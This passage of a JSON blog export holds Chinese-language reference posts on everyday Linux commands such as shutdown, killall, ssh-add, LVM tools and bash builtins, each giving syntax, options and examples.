[警告信息]：要传送给所有登入用户的信息。 实例 指定现在立即关机： shutdown -h now 指定 5 分钟后关机，同时送出警告信息给登入用户： shutdown +5 &quot;System will shutdown after 5 minutes&quot; ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"shutdown","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/shutdown/","stats":{"text":"1 min read","time":58000,"words":261,"minutes":1},"date":"2022-02-01 21:56:05","dateFormat":"2022-02-01"},{"content":"使用进程的名称来杀死一组进程。 补充说明 killall 命令使用进程的名称来杀死进程，使用此指令可以杀死一组同名进程。我们可以使用 kill 命令杀死指定进程 PID 的进程，如果要找到我们需要杀死的进程，我们还需要在之前使用 ps 等命令再配合 grep 来查找进程，而 killall 把这两个过程合二为一，是一个很好用的命令。 语法 killall (选项) (参数) 选项 -e：对长名称进行精确匹配； -l：忽略大小写的不同； -p：杀死进程所属的进程组； -i：交互式杀死进程，杀死进程前需要进行确认； -l：打印所有已知信号列表； -q：如果没有进程被杀死。则不输出任何信息； -r：使用正规表达式匹配要杀死的进程名称； -s：用指定的进程号代替默认信号“SIGTERM”； -u：杀死指定用户的进程。 参数 进程名称：指定要杀死的进程名称。 实例 杀死所有同名进程 killall vi ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"killall","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/killall/","stats":{"text":"2 min read","time":60000,"words":284,"minutes":2},"date":"2022-02-01 21:55:49","dateFormat":"2022-02-01"},{"content":"shell 中给临时文件命名。 补充说明 有时候在写 Shell 脚本的时候需要一些临时存储数据的才做，最适合存储临时文件数据的位置就是/tmp，因为该目录中所有的内容在系统重启后就会被清空。下面是两种方法为临时数据生成标准的文件名。 tempfile 命令 tempfile 命令只有在基于 Debian 的发行版中才默认自带，比如 Ubuntu，其他发行版没有这个命令。 用 tempfile 命令为一个临时文件命名： temp_file_name=$(tempfile) 用一个加带了随机数的文件名作为临时文件命名： temp_file_name=&quot;/tmp/file_$RANDOM&quot; $RANDOM 是一个返回随机数的环境变量。 $变量 如果没有 tempfile 命令的 Linux 发行版，也可以使用自己的临时文件名： temp_file_name=&quot;/tmp/file.$&quot; $是系统预定义变量，显示当前所在进程的进程号，用.$作为添加的后缀会被扩展成当前运行脚本的进程 id。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tempfile","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tempfile/","stats":{"text":"1 min read","time":56000,"words":263,"minutes":1},"date":"2022-02-01 21:55:30","dateFormat":"2022-02-01"},{"content":"查询 SElinux 策略内各项规则的布尔值。 补充说明 getsebool 命令是用来查询 SElinux 策略内各项规则的布尔值。SELinux 的策略与规则管理相关命令：seinfo 命令、sesearch 命令、getsebool 命令、setsebool 命令、semanage 命令。 语法 getsebool [-a] [布尔值条款 ] 选项 -a：列出目前系统上面的所有布尔值条款设置为开启或关闭值。 实例 查询本系统内所有的布尔值设置状况： getsebool -a NetworkManager_disable_trans --&gt; off allow_console_login --&gt; off allow_cvs_read_shadow --&gt; off allow_daemons_dump_core --&gt; on ....(底下省略).... 查询 httpd_enable_homedirs 是否为关闭，若没关闭，请关闭它： getsebool httpd_enable_homedirs setsebool -P httpd_enable_homedirs=0 # 0是关闭 1是开启 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"getsebool","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/getsebool/","stats":{"text":"1 min read","time":39000,"words":169,"minutes":1},"date":"2022-02-01 21:54:36","dateFormat":"2022-02-01"},{"content":"用于创建 LVM 的逻辑卷。 补充说明 lvcreate 命令用于创建 LVM 的逻辑卷。逻辑卷是创建在卷组之上的。逻辑卷对应的设备文件保存在卷组目录下，例如：在卷组&quot;vg1000&quot;上创建一个逻辑卷&quot;lvol0&quot;，则此逻辑卷对应的设备文件为&quot;/dev/vg1000/lvol0&quot;。 语法 lvcreate (选项) (参数) 选项 -L：指定逻辑卷的大小，单位为“kKmMgGtT”字节； -l：指定逻辑卷的大小（LE 数）。 参数 逻辑卷：指定要创建的逻辑卷名称。 实例 使用 lvcreate 命令在卷组&quot;vg1000&quot;上创建一个 200MB 的逻辑卷。在命令行中输入下面的命令： [root@localhost ~]# lvcreate -L 200M vg1000 #创建大小为 200M 的逻辑卷 输出信息如下： Logical volume &quot;lvol0&quot; created 说明：创建成功后，新的逻辑卷&quot;lvol0&quot;，将通过设备文件/dev/vg1000/lvol0进行访问。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lvcreate","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lvcreate/","stats":{"text":"1 min read","time":54000,"words":235,"minutes":1},"date":"2022-02-01 21:52:37","dateFormat":"2022-02-01"},{"content":"打印指定用户所在组的名称。。 概要 groups [OPTION]... [username]... 主要用途 打印指定用户所在组的名称。 选项 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 参数 username（可选）：可以是一到多个，不提供时默认为当前用户。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 显示 linux 用户所属的组 [root@localhost ~]# groups linux linux : linux adm dialout cdrom plugdev lpadmin admin sambashare 注意 该命令等价于 id -Gn。 每个用户属于/etc/passwd中指定的一个组和在/etc/group中指定的其他组。 该命令是GNU coreutils包中的命令，相关的帮助信息请查看man -s 1 groups，info coreutils 'groups invocation'。 ","tags":[],"title":"groups","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/groups/","stats":{"text":"1 min read","time":43000,"words":186,"minutes":1},"date":"2022-02-01 21:52:08","dateFormat":"2022-02-01"},{"content":"查询 SELinux 策略的规则详情。 补充说明 使用 seinfo 命令可以查询 SELinux 的策略提供多少相关规则，如果查到的相关类型或者布尔值，想要知道详细规则时，使用 sesearch 命令查询。SELinux 的策略与规则管理相关命令：seinfo 命令、sesearch 命令、getsebool 命令、setsebool 命令、semanage 命令。 语法 -a:列出该类型或布尔值的所有相关信息 -t:后面还要接类型，例如 -t httpd_t -b:后面还要接布尔值的规则，例如 -b httpd_enable_ftp_server 选项 -a:列出该类型或布尔值的所有相关信息-t:后面还要接类型，例如 -t httpd_t-b:后面还要接布尔值的规则，例如 -b httpd_enable_ftp_server 实例 找出目标文件资源类型为httpd_sys_content_t的有关信息： sesearch -a -t httpd_sys_content_t 找出主体进程为httpd_t且目标文件类型为 httpd 相关的所有信息： sesearch -s httpd_t -t httpd_* -a 查看布尔值httpd_enable_homedirs设置了多少规则 sesearch -b httpd_enable_homedirs -a ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sesearch","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sesearch/","stats":{"text":"1 min read","time":58000,"words":257,"minutes":1},"date":"2022-02-01 21:51:42","dateFormat":"2022-02-01"},{"content":"显示和设置系统的主机名。 补充说明 hostname 命令用于显示和设置系统的主机名称。环境变量 HOSTNAME 也保存了当前的主机名。在使用 hostname 命令设置主机名后，系统并不会永久保存新的主机名，重新启动机器之后还是原来的主机名。如果需要永久修改主机名，需要同时修改/etc/hosts和/etc/sysconfig/network的相关内容。 语法 hostname (选项) (参数) 选项 -v：详细信息模式； -a：显示主机别名； -d：显示 DNS 域名； -f：显示 FQDN 名称； -i：显示主机的 ip 地址； -s：显示短主机名称，在第一个点处截断； -y：显示 NIS 域名。 参数 主机名：指定要设置的主机名。 实例 [root@AY1307311912260196fcZ ~]# hostname AY1307311912260196fcZ # change hostname hostname newname # for now vi /etc/hosts # forever reboot ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"hostname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/hostname/","stats":{"text":"1 min read","time":48000,"words":214,"minutes":1},"date":"2022-02-01 21:51:13","dateFormat":"2022-02-01"},{"content":"打印当前有效的用户 ID 对应的名称。 概要 whoami [OPTION]... 主要用途 打印当前有效的用户 ID 对应的名称。 选项 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 [root@localhost ~]# whoami root 注意 该命令等价于 id -un。 注意区分 whoami 和 logname 这两个命令； 比如我们以用户 root 打开的终端，然后切换到了用户 user2。此时， whoami返回的是当前用户 user2, logname 返回的是 root，大家可以自行实践验证一下。 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 whoami，info coreutils 'whoami invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"whoami","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/whoami/","stats":{"text":"1 min read","time":43000,"words":188,"minutes":1},"date":"2022-02-01 21:50:28","dateFormat":"2022-02-01"},{"content":"系统运行状态统计工具。 补充说明 sar 命令是 Linux 下系统运行状态统计工具，它将指定的操作系统状态计数器显示到标准输出设备。sar 工具将对系统当前的状态进行取样，然后通过计算数据和比例来表达系统的当前运行状态。它的特点是可以连续对系统取样，获得大量的取样数据。取样数据和分析的结果都可以存入文件，使用它时消耗的系统资源很小。 语法 sar (选项) (参数) 选项 -A：显示所有的报告信息； -b：显示 I/O 速率； -B：显示换页状态； -c：显示进程创建活动； -d：显示每个块设备的状态； -e：设置显示报告的结束时间； -f：从指定文件提取报告； -i：设状态信息刷新的间隔时间； -P：报告每个 CPU 的状态； -R：显示内存状态； -u：显示 CPU 利用率； -v：显示索引节点，文件和其他内核表的状态； -w：显示交换分区状态； -x：显示给定进程的状态。 参数 间隔时间：每次报告的间隔时间（秒）； 次数：显示报告的次数。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sar","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sar/","stats":{"text":"2 min read","time":67000,"words":318,"minutes":2},"date":"2022-02-01 21:50:11","dateFormat":"2022-02-01"},{"content":"openssh 套件中的客户端连接工具。 补充说明 ssh 命令是 openssh 套件中的客户端连接工具，可以给予 ssh 加密协议实现安全的远程登录服务器。 语法 ssh (选项) (参数) 选项 -1：强制使用 ssh 协议版本 1； -2：强制使用 ssh 协议版本 2； -4：强制使用 IPv4 地址； -6：强制使用 IPv6 地址； -A：开启认证代理连接转发功能； -a：关闭认证代理连接转发功能； -b：使用本机指定地址作为对应连接的源 ip 地址； -C：请求压缩所有数据； -F：指定 ssh 指令的配置文件； -f：后台执行 ssh 指令； -g：允许远程主机连接主机的转发端口； -i：指定身份文件； -l：指定连接远程服务器登录用户名； -N：不执行远程指令； -o：指定配置选项； -p：指定远程服务器上的端口； -q：静默模式； -X：开启 X11 转发功能； -x：关闭 X11 转发功能； -y：开启信任 X11 转发功能。 参数 远程主机：指定要连接的远程 ssh 服务器； 指令：要在远程 ssh 服务器上执行的指令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ssh","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ssh/","stats":{"text":"2 min read","time":67000,"words":304,"minutes":2},"date":"2022-02-01 21:49:47","dateFormat":"2022-02-01"},{"content":"分屏上下翻页浏览文件内容。 补充说明 less 命令的作用与 more 十分相似，都可以用来浏览文字档案的内容，不同的是 less 命令允许用户向前或向后浏览文件，而 more 命令只能向前浏览。用 less 命令显示文件时，用 PageUp 键向上翻页，用 PageDown 键向下翻页。要退出 less 程序，应按 Q 键。 语法 less (选项) (参数) 选项 -e：文件内容显示完毕后，自动退出； -f：强制显示文件； -g：不加亮显示搜索到的所有关键词，仅显示当前显示的关键字，以提高显示速度； -l：搜索时忽略大小写的差异； -N：每一行行首显示行号； -s：将连续多个空行压缩成一行显示； -S：在单行显示较长的内容，而不换行显示； -x&lt;数字&gt;：将 TAB 字符显示为指定个数的空格字符。 参数 文件：指定要分屏显示内容的文件。 实例 sudo less /var/log/shadowsocks.log ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"less","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/less/","stats":{"text":"1 min read","time":58000,"words":267,"minutes":1},"date":"2022-02-01 21:49:30","dateFormat":"2022-02-01"},{"content":"修改正在运行的进程的调度优先级。 补充说明 renice 命令可以修改正在运行的进程的调度优先级。预设是以程序识别码指定程序调整其优先权，您亦可以指定程序群组或用户名称调整优先权等级，并修改所有隶属于该程序群组或用户的程序的优先权。只有系统管理者可以改变其他用户程序的优先权，也仅有系统管理者可以设置负数等级。 语法 renice (选项) (参数) 选项 -g：指定进程组 id； -p&lt;程序识别码&gt;：改变该程序的优先权等级，此参数为预设值。-u：指定开启进程的用户名。 参数 进程号：指定要修改优先级的进程。 实例 将行程 id 为 987 及 32 的行程与行程拥有者为 daemon 及 root 的优先序号码加 1： renice 1 987 -u daemon root -p 32 注意：每一个行程都有一个唯一的 id。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"renice","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/renice/","stats":{"text":"1 min read","time":56000,"words":263,"minutes":1},"date":"2022-02-01 21:49:00","dateFormat":"2022-02-01"},{"content":"显示物理卷的属性。 补充说明 pvdisplay 命令用于显示物理卷的属性。pvdisplay 命令显示的物理卷信息包括：物理卷名称、所属的卷组、物理卷大小、PE 大小、总 PE 数、可用 PE 数、已分配的 PE 数和 UUID。 语法 pvdisplay (选项) (参数) 选项 -s：以短格式输出； -m：显示 PE 到 LE 的映射。 参数 物理卷：要显示的物理卷对应的设备文件名。 实例 使用 pvdisplay 命令显示指定的物理卷的基本信息。在命令行中输入下面的命令： [root@localhost ~]# pvdisplay /dev/sdb1 #显示物理卷基本信息 输出信息如下： &quot;/dev/sdb1&quot; is a new physical volume of &quot;101.94 MB&quot; --- NEW Physical volume --- PV Name /dev/sdb1 ....省略部分输出内容...... PV UUID FOXiS2-Ghaj-Z0Mf- cdVZ-pfpk- dP9p-ifIZXN ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pvdisplay","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pvdisplay/","stats":{"text":"1 min read","time":49000,"words":207,"minutes":1},"date":"2022-02-01 21:47:51","dateFormat":"2022-02-01"},{"content":"查看文件的第二扩展文件系统属性。 补充说明 lsattr 命令用于查看文件的第二扩展文件系统属性。 语法 lsattr (选项) (参数) 选项 -E：可显示设备属性的当前值，但这个当前值是从用户设备数据库中获得的，而不是从设备直接获得的。-D：显示属性的名称，属性的默认值，描述和用户是否可以修改属性值的标志。-R：递归的操作方式； -V：显示指令的版本信息； -a：列出目录中的所有文件，包括隐藏文件。 lsattr 经常使用的几个选项-D，-E，-R 这三个选项不可以一起使用，它们是互斥的，经常使用的还有-l,-H，使用 lsattr 时，必须指出具体的设备名，用-l 选项指出要显示设备的逻辑名称，否则要用-c，-s，-t 等选项唯一的确定某个已存在的设备。 参数 文件：指定显示文件系统属性的文件名。 实例 lsattr -E -l rmt0 -Hlsattr -EO -l rmt0 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lsattr","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lsattr/","stats":{"text":"1 min read","time":59000,"words":277,"minutes":1},"date":"2022-02-01 21:47:34","dateFormat":"2022-02-01"},{"content":"域名查询工具。 补充说明 dig 命令是常用的域名查询工具，可以用来测试域名系统工作是否正常。 语法 dig (选项) (参数) 选项 @&lt;服务器地址&gt;：指定进行域名解析的域名服务器； -b&lt;ip 地址&gt;：当主机具有多个 IP 地址，指定使用本机的哪个 IP 地址向域名服务器发送域名查询请求； -f&lt;文件名称&gt;：指定 dig 以批处理的方式运行，指定的文件中保存着需要批处理查询的 DNS 任务信息； -P：指定域名服务器所使用端口号； -t&lt;类型&gt;：指定要查询的 DNS 数据类型； -x&lt;IP 地址&gt;：执行逆向域名查询； -4：使用 IPv4； -6：使用 IPv6； -h：显示指令帮助信息。 参数 主机：指定要查询域名主机； 查询类型：指定 DNS 查询的类型； 查询类：指定查询 DNS 的 class； 查询选项：指定查询选项。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dig","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dig/","stats":{"text":"1 min read","time":57000,"words":258,"minutes":1},"date":"2022-02-01 21:47:13","dateFormat":"2022-02-01"},{"content":"激活 Linux 系统中交换空间。 补充说明 swapon 命令用于激活 Linux 系统中交换空间，Linux 系统的内存管理必须使用交换区来建立虚拟内存。 语法 swapon (选项) (参数) 选项 -a：将/etc/fstab 文件中所有设置为 swap 的设备，启动为交换区； -h：显示帮助； -p&lt;优先顺序&gt;：指定交换区的优先顺序； -s：显示交换区的使用状况； -V：显示版本信息。 参数 交换空间：指定需要激活的交换空间，可以是交换文件和交换分区，如果是交换分区则指定交换分区对应的设备文件。 实例 mkswap -c /dev/hdb4 （-c是检查有无坏块） swapon -v /dev/hdb4 swapon -s Filename type Size Used Priority /dev/hda5 partition 506008 96 -1 /dev/hdb4 partition 489972 0 -2 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"swapon","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/swapon/","stats":{"text":"1 min read","time":49000,"words":209,"minutes":1},"date":"2022-02-01 21:46:53","dateFormat":"2022-02-01"},{"content":"把专用密钥添加到 ssh-agent 的高速缓存中。 补充说明 ssh-add 命令是把专用密钥添加到 ssh-agent 的高速缓存中。该命令位置在/usr/bin/ssh-add。 语法 ssh-add [-cDdLlXx] [-t life] [file ...] ssh-add -s pkcs11 ssh-add -e pkcs11 选项 -D：删除ssh-agent中的所有密钥. -d：从ssh-agent中的删除密钥 -e pkcs11：删除PKCS#11共享库pkcs1提供的钥匙。 -s pkcs11：添加PKCS#11共享库pkcs1提供的钥匙。 -L：显示ssh-agent中的公钥 -l：显示ssh-agent中的密钥 -t life：对加载的密钥设置超时时间，超时ssh-agent将自动卸载密钥 -X：对ssh-agent进行解锁 -x：对ssh-agent进行加锁 实例 1、把专用密钥添加到 ssh-agent 的高速缓存中： ssh-add ~/.ssh/id_dsa 2、从 ssh-agent 中删除密钥： ssh-add -d ~/.ssh/id_xxx.pub 3、查看 ssh-agent 中的密钥： ssh-add -l ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ssh-add","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ssh-add/","stats":{"text":"1 min read","time":58000,"words":227,"minutes":1},"date":"2022-02-01 21:46:23","dateFormat":"2022-02-01"},{"content":"在指定的时间关闭 FTP 服务器。 补充说明 功能说明：在指定的时间关闭 ftp 服务器。本指令提供系统管理者在设置的时间关闭 FTP 服务器，且能在关闭之前发出警告信息通知用户。关闭时间若设置后为&quot;none&quot;，则会马上关闭服务器。如果采 用&quot;+30&quot;的方式来设置表示服务器在 30 分钟之后关闭。依次类推，假设使用&quot;1130&quot;的格式则代表服务器会在每日的 11 时 30 分关闭，时间格式为 24 小时制。FTP 服务器关闭后，在/etc 目录下会产生一个名称为 shutmsg 的文件，把它删除后即可再度启动 FTP 服务器的功能。 语法： ftpshut [-d&lt;分钟&gt;][-l&lt;分钟&gt;][关闭时间 ][&quot;警告信息&quot;] 参数： -d&lt;分钟&gt; 切断所有 FTP 连线时间。-l&lt;分钟&gt; 停止接受 FTP 登入的时间。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ftpshut","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ftpshut/","stats":{"text":"1 min read","time":57000,"words":254,"minutes":1},"date":"2022-02-01 21:45:58","dateFormat":"2022-02-01"},{"content":"用于创建 LVM 卷组。 补充说明 vgcreate 命令用于创建 LVM 卷组。卷组（Volume Group）将多个物理卷组织成一个整体，屏蔽了底层物理卷细节。在卷组上创建逻辑卷时不用考虑具体的物理卷信息。 语法 vgcreate (选项) (参数) 选项 -l：卷组上允许创建的最大逻辑卷数； -p：卷组中允许添加的最大物理卷数； -s：卷组上的物理卷的 PE 大小。 参数 卷组名：要创建的卷组名称； 物理卷列表：要加入到卷组中的物理卷列表。 实例 使用 vgcreate 命令创建卷组 &quot;vg1000&quot;，并且将物理卷/dev/sdb1和/dev/sdb2添加到卷组中。在命令行中输入下面的命令： [root@localhost ~]# vgcreate vg1000 /dev/sdb1 /dev/sdb2 #创建卷组&quot;vg1000&quot; 输出信息如下： Volume group &quot;vg1000&quot; successfully created ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgcreate","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgcreate/","stats":{"text":"1 min read","time":50000,"words":223,"minutes":1},"date":"2022-02-01 21:45:34","dateFormat":"2022-02-01"},{"content":"打印当前终端登录用户的名称。。 概要 logname [OPTION]... 主要用途 打印当前终端登录用户的名称。 选项 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 返回值 返回 0 表示成功，返回非 0 值表示失败。 例子 [root@localhost ~]# logname root 注意 注意区分 whoami 和 logname 这两个命令； 比如我们以用户 root 打开的终端，然后切换到了用户 user2。此时， whoami返回的是当前用户 user2, logname 返回的是 root，大家可以自行实践验证一下。 该命令是GNU coreutils包中的命令，相关的帮助信息请查看man -s 1 logname，info coreutils 'logname invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"logname","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/logname/","stats":{"text":"1 min read","time":40000,"words":176,"minutes":1},"date":"2022-02-01 21:45:05","dateFormat":"2022-02-01"},{"content":"移动位置参数。。 概要 shift [n] 主要用途 将位置参数$n, $n+1...重命名为$1, $2...。 参数 n（可选）：大于等于 1 且小于等于参数个数的整数，默认为 1。 返回值 返回成功除非 n 大于参数个数或 n 小于 1 以及其他非法值。 例子 假设我们的脚本文件（test.sh）如下： #!/usr/bin/env bash # 显示前三个位置参数。 echo &quot;$1 $2 $3&quot; # 移除前两个位置参数，并将$3重命名为$1，之后的以此类推。 shift 2 echo &quot;$1 $2 $3&quot; 在终端执行该脚本： sh test.sh q w e r t 返回信息如下： q w ee r t 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"shift","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/shift/","stats":{"text":"1 min read","time":48000,"words":199,"minutes":1},"date":"2022-02-01 21:44:24","dateFormat":"2022-02-01"},{"content":"向指定登录用户终端上发送信息。 补充说明 write 命令用于向指定登录用户终端上发送信息。通过 write 命令可传递信息给另一位登入系统的用户，当输入完毕后，键入 EOF 表示信息结束，write 命令就会将信息传给对方。如果接收信息的用户不只登入本地主机一次，你可以指定接收信息的终端机编号。 语法 write (参数) 参数 用户：指定要接受信息的登录用户； 登陆终端：指定接收信息的用户的登录终端。 实例 传信息给 Rollaend，此时 Rollaend 只有一个连线 : write Rollaend 接下来就是将信息打上去，结束请 Ctrl+C： 传信息给 Rollaend、Rollaend 的连线有 pts/2、pts/3： write Rollaend pts/2 接下来就是将信息打上去，结束请 Ctrl+C： 若对方设定mesg n，则此时信息将无法传给对方。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"write","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/write/","stats":{"text":"1 min read","time":53000,"words":245,"minutes":1},"date":"2022-02-01 21:44:10","dateFormat":"2022-02-01"},{"content":"从函数中退出并返回数值。。 概要 return [n] 主要用途 使得 shell 函数退出并返回数值，如果没有指定 n 的值，则默认为函数最后一条命令执行的返回状态。 参数 n（可选）：整数。 返回值 返回值为你指定的参数 n 的值，如果你指定的参数大于 255 或小于 0，那么会通过加或减 256 的方式使得返回值总是处于 0 到 255 之间。 在函数外执行 return 语句会返回失败。 例子 &lt;span class=&quot;token shebang important&quot;&gt;#!/usr/bin/env bash# 定义一个返回值大于 255 的函数 &lt;span class=&quot;token function-name function&quot;&gt;example() { return 259}# 执行函数 example# 显示 3echo $? 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"return","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/return/","stats":{"text":"1 min read","time":49000,"words":210,"minutes":1},"date":"2022-02-01 21:43:37","dateFormat":"2022-02-01"},{"content":"分析消息队列共享内存和信号量 。 补充说明 ipcs 命令用于报告 Linux 中进程间通信设施的状态，显示的信息包括消息列表、共享内存和信号量的信息。 语法 ipcs (选项) 选项 -a：显示全部可显示的信息； -q：显示活动的消息队列信息； -m：显示活动的共享内存信息； -s：显示活动的信号量信息。 实例 ipcs -a ------ Shared Memory Segments -------- key shmid owner perms bytes nattch status 0x7401833d 2654208 root 600 4 0 0x00000000 3145729 root 600 4194304 9 dest 0x7401833c 2621442 root 600 4 0 0xd201012b 3080195 root 600 1720 2 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"ipcs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/ipcs/","stats":{"text":"1 min read","time":37000,"words":151,"minutes":1},"date":"2022-02-01 21:43:14","dateFormat":"2022-02-01"},{"content":"在函数内定义局部变量。。 概要 local [-aAfFgilnrtux] [-p] [name[=value] ...] 主要用途 在函数内定义局部变量 显示局部变量 在函数内定义全局变量 选项 local 命令的选项与 declare 命令的相同，请参考 declare 命令的选项。 参数 name（可选）：变量名或已定义函数名。 value（可选）：变量的值。 返回值 local返回 true 除非你提供了非法选项、赋值错误或是在函数外使用local命令。 例子 相关例子请参考 declare 命令 错误用法 在函数外使用该命令。 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令以及man bash、info bash的相应部分。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"local","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/local/","stats":{"text":"1 min read","time":40000,"words":184,"minutes":1},"date":"2022-02-01 21:42:56","dateFormat":"2022-02-01"},{"content":"Debian Linux 中将大软件包分割成小包。 补充说明 dpkg-split 命令用来将 Debian Linux 中的大软件包分割成小软件包，它还能够将已分割的文件进行合并。 语法 dpkg-split (选项) (参数) 选项 -S：设置分割后的每个小文件最大尺寸（以字节为单位）； -s：分割软件包； -j&lt;分块文件&gt;&lt;分块文件&gt;：把各个分块合并到一起； -I&lt;分块文件&gt;：显示分块文件的相关信息； -l：列出不匹配的部分； -dscard&lt;文件名&gt;：忽略不匹配的部分。 参数 软件包：指定需要分割的“.deb”软件包。 实例 把 foo.deb 分割出 N 个大小为 460KB 的文件： dpkg-split -s foo.deb 合并分割文件： dpkg-split -j &quot;foo*&quot; ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dpkg-split","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dpkg-split/","stats":{"text":"1 min read","time":47000,"words":206,"minutes":1},"date":"2022-02-01 21:42:41","dateFormat":"2022-02-01"},{"content":"从卷组中删除物理卷。 补充说明 vgreduce 命令通过删除 LVM 卷组中的物理卷来减少卷组容量。不能删除 LVM 卷组中剩余的最后一个物理卷。 语法 vgreduce (选项) (参数) 选项 -a：如果命令行中没有指定要删除的物理卷，则删除所有的空物理卷； --removemissing：删除卷组中丢失的物理卷，使卷组恢复正常状态。 参数 卷组：指定要操作的卷组名称； 物理卷列表：指定要删除的物理卷列表。 实例 使用 vgreduce 命令从卷组&quot;vg2000&quot;中移除物理卷/dev/sdb2。在命令行中输入下面的命令： [root@localhost ~]# vgreduce vg2000 /dev/sdb2 #将物理卷&quot;/dev/sdb2&quot;从卷组&quot;vg2000&quot;中删除 输出信息如下： Removed &quot;/dev/sdb2&quot; from volume group &quot;vg2000&quot; ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"vgreduce","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/vgreduce/","stats":{"text":"1 min 